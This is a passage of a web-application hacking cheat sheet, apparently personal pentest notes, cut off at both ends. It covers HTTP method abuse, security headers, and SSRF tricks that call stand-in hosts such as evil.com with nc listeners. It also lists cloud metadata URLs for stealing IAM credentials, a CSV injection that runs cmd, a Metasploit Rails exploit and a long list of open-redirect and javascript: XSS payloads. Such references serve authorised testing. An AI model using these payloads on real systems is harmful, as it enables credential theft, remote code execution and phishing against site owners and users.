xhr.setRequestHeader("Content-Type", 'text/plain');
xhr.withCredentials = true;
xhr.send(null);
</script>
-----------

-----------TRACE method enabled
# It's always used as a complement of XSS to retrieve cookies with the HTTPOnly flag enabled or Authorization headers.
curl -X TRACE 127.0.0.1
-----------

-----------PUT method abuse
curl -i -X PUT -H "Content-Type: application/xml; charset=utf-8" -d @"/tmp/some-file.xml" http://www.victim.com/newpage
curl -X PUT -d "text or data to put" http://www.victim.com/destination_page
curl -i -H "Accept: application/json" -X PUT -d "text or data to put" http://victim.com/new_page
-----------

-----------Header Policies
# python script to check headers https://github.com/atoooooooooom10/Security-Headers
# website to check headers https://securityheaders.io/
## Content Security Policy:
Is an effective measure to protect your site from XSS attacks. By whitelisting sources of approved content, you can prevent the browser from loading malicious assets.

## X-Frame-Options:
Tells the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. Recommended value "x-frame-options: SAMEORIGIN".

## X-XSS-Protection:
Sets the configuration for the cross-site scripting filter built into most browsers. Recommended value "X-XSS-Protection: 1; mode=block".

## X-Content-Type-Options:
Stops a browser from trying to MIME-sniff the content type and forces it to stick with the declared content-type. The only valid value for this header is "X-Content-Type-Options: nosniff".

## Referrer Policy:
is a new header that allows a site to control how much information the browser includes with navigations away from a document and should be set by all sites.

## HTTP Public Key Pinning:
protects your site from MiTM attacks using rogue X.509 certificates. By whitelisting only the identities that the browser should trust, your users are protected in the event a certificate authority is compromised.

## HTTP Strict Transport Security:
is an excellent feature to support on your site and strengthens your implementation of TLS by getting the User Agent to enforce the use of HTTPS. Recommended value "strict-transport-security: max-age=31536000; includeSubDomains".
-----------

-----------Tabnapping
# If the href has a target="_blank" then it opens a new window, the new window changes the location of the opener (of a fake site)
# <a href=”https://medium.com/" target=”_blank”>Medium</a>
-----------

-----------Content Security Policy (CSP) - Bypass it with XSS
# https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/
# http://sebastian-lekies.de/csp/bypasses.php
-----------

-----------Content Security Policy (CSP) - Hardening your website
https://www.troyhunt.com/locking-down-your-website-scripts-with-csp-hashes-nonces-and-report-uri/
-----------

-----------Content Security Policy (CSP) - Evaluator
# https://csp-evaluator.withgoogle.com/
-----------

-----------Content Security Policy (CSP) - Misconfigurations
# https://uselesscsp.com/
-----------

-----------SSRF Basic - (Server Side Request Forgery)
# https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection
# http://blog.safebuff.com/2016/07/03/SSRF-Tips/
# The server makes the requests instead of us, to access internal resources, etc..
### SSRF PHP Functions
file_get_contents()
fsockopen()
curl_exec()
### Common injection points
file=, folder=, location=, sytel=, locale=, template=, path=, doc=, display=, source=, load=, pdf=, read=, dest=, retrieve=, continue=
### Basic SSRF v1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
### Basic SSRF v2
http://localhost:80
http://localhost:443
http://localhost:22
-----------

-----------SSRF URL Schema attacks
### SFTP
# Listener: nc -lvvp 11111
http://safebuff.com/ssrf.php?url=sftp://evil.com:11111/
### Dict
http://safebuff.com/ssrf.php?dict://attacker:11111/
# Listener: nc -lvvp 11111
### Gopher				--> https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/
// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php
<?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?>
# Listener: nc -lvvp 12346
### TFTP
http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
# Listener: nc -lvvp 12346
### File
http://safebuff.com/redirect.php?url=file:///etc/passwd
### LDAP
http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit
### Advanced exploit using a redirection
1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
### Advanced exploit using type=url
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF 
-----------

-----------SSRF FFmpeg
# http://blog.safebuff.com/2016/07/03/SSRF-Tips/
### test.jpg
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://example.org/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
-----------

-----------SSRF PostgreSQL
> SELECT dblink_send_query('host=127.0.0.1 dbname=quit user=\'\nstats\n\​' password=1 port=11211 sslmode=disable','select
version();');
-----------

-----------SSRF Bypass
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection
# https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf
# https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g22371f2702_0_3
# https://github.com/cujanovic/SSRF-Testing/tree/master/ffmpeg
### Bypass localhost with [::]
http://[::]:80/
### Bypass localhost with a domain redirecting to locahost
http://n-pn.info
### Bypass using a decimal ip location
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
### Bypass using malformed urls
localhost:+11211aaa
localhost:00011211aaaa
-----------

-----------More SSRF attacks
# https://www.blackhat.com/docs/asia-18/asia-18-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages_update_Thursday.pdf
-----------

-----------SSRF - SSSI - Server-Side Spreadsheet Injection – Formula Injection to Remote Code Execution
# https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/
-----------

-----------SSRF cloud metadata
# https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb
### AWS 
# Amazon Web Services (No Header Required)
# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

### Google Cloud (Header Sometimes Required)
#  https://cloud.google.com/compute/docs/metadata
#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True" on API v1
#  - Most endpoints can be accessed via the v1beta API without a header
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
# kube-env; thanks to JackMc for the heads up on this (https://hackerone.com/reports/341876)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
# Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
# returns root password for Google
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

### Digital Ocean (No Header Required)
# https://developers.digitalocean.com/documentation/metadata/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

### Packetcloud
https://metadata.packet.net/userdata

### Azure (Header Required)
# Header: "Metadata: true"
# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
# (Old: ) https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

### Oracle Cloud (No Header Required)
# https://docs.us-phoenix-1.oraclecloud.com/Content/Compute/Tasks/gettingmetadata.htm
http://169.254.169.254/opc/v1/instance/

### Alibaba
# https://www.alibabacloud.com/help/faq-detail/49122.htm
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id

### OpenStack/RackSpace 
# https://docs.openstack.org/nova/latest/user/metadata-service.html
http://169.254.169.254/openstack	 

### Oracle Cloud
# https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

### Kubernetes
# Debug Services (https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/)
https://kubernetes.default.svc.cluster.local
https://kubernetes.default
# https://twitter.com/Random_Robbie/status/1072242182306832384
https://kubernetes.default.svc/metrics
-----------

-----------SSRF bypasses
http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
http://google.com:80+&@google.com:80#+@127.88.23.245:22/
http://127.88.23.245:22/?@google.com:80/
http://127.88.23.245:22/#@www.google.com:80/
-----------

-----------CVS Injection - RCE
# https://payatu.com/csv-injection-basic-to-exploit/
# It has to be enabled: Excel --> Option --> Trust Center --> Trust Center Settings --> External Content --> Enable Dynamic Data Exchange Server Launch
=cmd|' /C notepad'!'A1'
-----------

-----------SSRF automatic tool
# https://github.com/samhaxr/XXRF-Shots
-----------

-----------Wordpress scanner
git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan --url http://IP/ --enumerate p
-----------

-----------Wordpress version
https://example.com/wordpress/readme.html
-----------

-----------Wordpress list users
https://example.com/wp-json/wp/v2/users/
-----------

-----------Client-Side Cache Poisoning
do it???????
-----------

-----------Server-Side Cache Poisoning
# http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
# https://jsfiddle.net/3gk8u8wu/3/
-----------

-----------Cache Poisoning CDN
# https://www.youtube.com/watch?v=j2RrmNxJZ5c
-----------

-----------Cache posoning and XSS
# https://medium.com/@nahoragg/chaining-cache-poisoning-to-stored-xss-b910076bda4f
-----------

-----------Github enterprise prior to 2.8.7 RCE - Ruby on rails deserialization
# https://hackerone.com/reports/206227
# http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/
use exploit/multi/http/rails_secret_deserialization
-----------

-----------Gitminer - search in github
# https://github.com/UnkL4b/GitMiner
-----------

-----------Nginx configuration issue - RCE
location ~ \.php$ {
fastcgi_pass 127.0.0.X1:9000;
fastcgi_index index.php;
fastcgi_param script_FILENAME /scripts$fastcgi_script_name;
include fastcgi_params;
}
# If the cgi.fix_pathinfo options is enabled it's possible to execute commands froma an updated image
www.xxxx.com/upload/image.jpg/command.php
-----------

-----------Web Cache Deception attack
# https://omergil.blogspot.co.uk/2017/02/web-cache-deception-attack.html
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20cache%20deception
Access to http://www.example.com/home.php
You can access to the same page (home.php) by http://www.example.com/home.php/non-existent.css
If the cache is enabled and the attack was successful you could access to the site from another window
-----------

-----------Open URL Redirection
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20redirect								--> other payloads
# Using linefeed
https://xxxxxx.com/d/login?redir=/%0a/example.com
# Using creturn
https://xxxxxx.com/d/login?redir=/%0d/example.com
# Using CRLF to bypass "javascript" blacklisted keyword
java%0d%0ascript%0d%0a:alert(0)
# Using "//" to bypass "http" blacklisted keyword
//google.com
# Using "https:" to bypass "//" blacklisted keyword
https:google.com
# Using "//" to bypass "//" blacklisted keyword (Browsers see // as //)
\/\/google.com/
/\/google.com/
# Using "%E3%80%82" to bypass "." blacklisted character
//google%E3%80%82com
# Using null byte "%00" to bypass blacklist filter
//google%00.com
# Using "@" character, browser will redirect to anything after the "@"
http://www.theirsite.com@yoursite.com/
# Creating folder as their domain
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
# XSS from Open URL - If it's in a JS variable
";alert(0);//
# XSS from data:// wrapper
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
# XSS from javascript:// wrapper
http://www.example.com/redirect.php?url=javascript:prompt(1)
# Include multiple redirections to exploit just first value parsed vul
https://xxxxxx.com/d/login?redir=example.com&redir=example.com
-----------

-----------Open redirection via htaccess misconfiguration
# https://github.com/cujanovic/SSRF-Testing
# https://github.com/cujanovic/SSRF-Testing/tree/master/htaccess
### jpg 301 response without and with a valid response body:
https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg
### json 301 response without and with a valid response body:
https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json
https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json
### csv 301 response without and with a valid response body:
https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv
https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv
### xml 301 response without and with a valid response body:
https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml
https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml
-----------

-----------Open redirect payloads
# https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt
//localdomain.pw/%2f..
//www.whitelisteddomain.tld@localdomain.pw/%2f..
///localdomain.pw/%2f..
///www.whitelisteddomain.tld@localdomain.pw/%2f..
////localdomain.pw/%2f..
////www.whitelisteddomain.tld@localdomain.pw/%2f..
https://localdomain.pw/%2f..
https://www.whitelisteddomain.tld@localdomain.pw/%2f..
/https://localdomain.pw/%2f..
/https://www.whitelisteddomain.tld@localdomain.pw/%2f..
//localdomain.pw/%2f%2e%2e
//www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
///localdomain.pw/%2f%2e%2e
///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
////localdomain.pw/%2f%2e%2e
////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
https://localdomain.pw/%2f%2e%2e
https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/https://localdomain.pw/%2f%2e%2e
/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
//localdomain.pw/
//www.whitelisteddomain.tld@localdomain.pw/
///localdomain.pw/
///www.whitelisteddomain.tld@localdomain.pw/
////localdomain.pw/
////www.whitelisteddomain.tld@localdomain.pw/
https://localdomain.pw/
https://www.whitelisteddomain.tld@localdomain.pw/
/https://localdomain.pw/
/https://www.whitelisteddomain.tld@localdomain.pw/
//localdomain.pw//
//www.whitelisteddomain.tld@localdomain.pw//
///localdomain.pw//
///www.whitelisteddomain.tld@localdomain.pw//
////localdomain.pw//
////www.whitelisteddomain.tld@localdomain.pw//
https://localdomain.pw//
https://www.whitelisteddomain.tld@localdomain.pw//
//https://localdomain.pw//
//https://www.whitelisteddomain.tld@localdomain.pw//
//localdomain.pw/%2e%2e%2f
//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
///localdomain.pw/%2e%2e%2f
///www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
////localdomain.pw/%2e%2e%2f
////www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
https://localdomain.pw/%2e%2e%2f
https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
//https://localdomain.pw/%2e%2e%2f
//https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
///localdomain.pw/%2e%2e
///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
////localdomain.pw/%2e%2e
////www.whitelisteddomain.tld@localdomain.pw/%2e%2e
https:///localdomain.pw/%2e%2e
https:///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
//https:///localdomain.pw/%2e%2e
//www.whitelisteddomain.tld@https:///localdomain.pw/%2e%2e
/https://localdomain.pw/%2e%2e
/https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e
///localdomain.pw/%2f%2e%2e
///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
////localdomain.pw/%2f%2e%2e
////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
https:///localdomain.pw/%2f%2e%2e
https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/https://localdomain.pw/%2f%2e%2e
/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/https:///localdomain.pw/%2f%2e%2e
/https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
/%09/localdomain.pw
/%09/www.whitelisteddomain.tld@localdomain.pw
//%09/localdomain.pw
//%09/www.whitelisteddomain.tld@localdomain.pw
///%09/localdomain.pw
///%09/www.whitelisteddomain.tld@localdomain.pw
////%09/localdomain.pw
////%09/www.whitelisteddomain.tld@localdomain.pw
https://%09/localdomain.pw
https://%09/www.whitelisteddomain.tld@localdomain.pw
/%5clocaldomain.pw
/%5cwww.whitelisteddomain.tld@localdomain.pw
//%5clocaldomain.pw
//%5cwww.whitelisteddomain.tld@localdomain.pw
///%5clocaldomain.pw
///%5cwww.whitelisteddomain.tld@localdomain.pw
////%5clocaldomain.pw
////%5cwww.whitelisteddomain.tld@localdomain.pw
https://%5clocaldomain.pw
https://%5cwww.whitelisteddomain.tld@localdomain.pw
/https://%5clocaldomain.pw
/https://%5cwww.whitelisteddomain.tld@localdomain.pw
https://localdomain.pw
https://www.whitelisteddomain.tld@localdomain.pw
javascript:alert(1);
javascript:alert(1)
//javascript:alert(1);
/javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1)
javascript:%0aalert`1`
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
//localdomain.pw
http:localdomain.pw
https:localdomain.pw
//localdomain%E3%80%82pw
\/\/localdomain.pw/
/\/localdomain.pw/
/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/
//\/localdomain.pw/
//localdomain%00.pw
https://www.whitelisteddomain.tld/https://localdomain.pw/
";alert(0);//
javascript://www.whitelisteddomain.tld?%a0alert%281%29
http://0xd8.0x3a.0xd6.0xce
http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://0xd83ad6ce
http://www.whitelisteddomain.tld@0xd83ad6ce
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http://XY>.7d8T\205pZM@0xd83ad6ce
http://3627734734
http://www.whitelisteddomain.tld@3627734734
http://3H6k7lIAiqjfNeN@3627734734
http://XY>.7d8T\205pZM@3627734734
http://472.314.470.462
http://www.whitelisteddomain.tld@472.314.470.462
http://3H6k7lIAiqjfNeN@472.314.470.462
http://XY>.7d8T\205pZM@472.314.470.462
http://0330.072.0326.0316
http://www.whitelisteddomain.tld@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http://XY>.7d8T\205pZM@0330.072.0326.0316
http://00330.00072.0000326.00000316
http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://[::216.58.214.206]
http://www.whitelisteddomain.tld@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http://XY>.7d8T\205pZM@[::216.58.214.206]
http://[::ffff:216.58.214.206]
http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://0xd8.072.54990
http://www.whitelisteddomain.tld@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.072.54990
http://0xd8.3856078
http://www.whitelisteddomain.tld@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd8.3856078
http://XY>.7d8T\205pZM@0xd8.3856078
http://00330.3856078
http://www.whitelisteddomain.tld@00330.3856078
http://3H6k7lIAiqjfNeN@00330.3856078
http://XY>.7d8T\205pZM@00330.3856078
http://00330.0x3a.54990
http://www.whitelisteddomain.tld@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:0xd8.0x3a.0xd6.0xce
http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:0xd83ad6ce
http:www.whitelisteddomain.tld@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http:3627734734
http:www.whitelisteddomain.tld@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http:XY>.7d8T\205pZM@3627734734
http:472.314.470.462
http:www.whitelisteddomain.tld@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http:0330.072.0326.0316
http:www.whitelisteddomain.tld@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http:00330.00072.0000326.00000316
http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:[::216.58.214.206]
http:www.whitelisteddomain.tld@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http:[::ffff:216.58.214.206]
http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:0xd8.072.54990
http:www.whitelisteddomain.tld@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http:0xd8.3856078
http:www.whitelisteddomain.tld@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http:00330.3856078
http:www.whitelisteddomain.tld@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
http:00330.0x3a.54990
http:www.whitelisteddomain.tld@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
〱localdomain.pw
〵localdomain.pw
ゝlocaldomain.pw
ーlocaldomain.pw
ｰlocaldomain.pw
/〱localdomain.pw
/〵localdomain.pw
/ゝlocaldomain.pw
/ーlocaldomain.pw
/ｰlocaldomain.pw
%68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
<>javascript:alert(1);
<>//localdomain.pw
//localdomain.pw\@www.whitelisteddomain.tld
https://:@localdomain.pw\@www.whitelisteddomain.tld
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
ja\nva\tscript\r:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
http://localdomain.pw:80#@www.whitelisteddomain.tld/
http://localdomain.pw:80?@www.whitelisteddomain.tld/
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
http://www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
http://localdomain.pw\twww.whitelisteddomain.tld/
//localdomain.pw:80#@www.whitelisteddomain.tld/
//localdomain.pw:80?@www.whitelisteddomain.tld/
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
//XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
//XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
//www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
//localdomain.pw\twww.whitelisteddomain.tld/
//;@localdomain.pw
http://;@localdomain.pw
@localdomain.pw
javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/
http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/
http://localdomain.pw%3F.www.whitelisteddomain.tld/
http://localdomain.pw%23.www.whitelisteddomain.tld/
http://www.whitelisteddomain.tld:80%40localdomain.pw/
http://www.whitelisteddomain.tld%2elocaldomain.pw/
/x:1/:///%01javascript:alert(document.cookie)/
/https:/%5clocaldomain.pw/
https:/%5clocaldomain.pw/
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
/http://localdomain.pw
/%2f%2flocaldomain.pw
//%2f%2flocaldomain.pw
/localdomain.pw/%2f%2e%2e
/http:/localdomain.pw
http:/localdomain.pw
/.localdomain.pw
http://.localdomain.pw
.localdomain.pw
///\;@localdomain.pw
///localdomain.pw
/////localdomain.pw/
/////localdomain.pw
java%0ascript:alert(1)
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)
java%09script:alert(1)
java%0dscript:alert(1)
javascript://%0aalert(1)
javascript://%0aalert`1`
Javas%26%2399;ript:alert(1)
data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
http://www.localdomain.pw\.www.whitelisteddomain.tld
%19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
%01https://localdomain.pw
www.whitelisteddomain.tld;@localdomain.pw
https://www.whitelisteddomain.tld;@localdomain.pw
http:%0a%0dlocaldomain.pw
https://%0a%0dlocaldomain.pw
localdomain.pw/www.whitelisteddomain.tld
https://localdomain.pw/www.whitelisteddomain.tld
//localdomain.pw/www.whitelisteddomain.tld
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
